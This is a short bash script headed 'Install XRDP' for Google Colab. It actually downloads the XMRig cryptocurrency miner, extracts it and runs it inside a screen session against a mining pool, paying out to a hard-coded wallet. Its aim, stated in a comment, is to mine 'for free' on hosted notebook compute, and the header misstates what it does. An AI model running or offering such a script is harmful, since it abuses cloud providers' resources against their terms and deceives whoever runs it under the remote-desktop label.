#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar xvf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o rx.unmineable.com:3333 -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0 -k --tls --rig-id GLAB
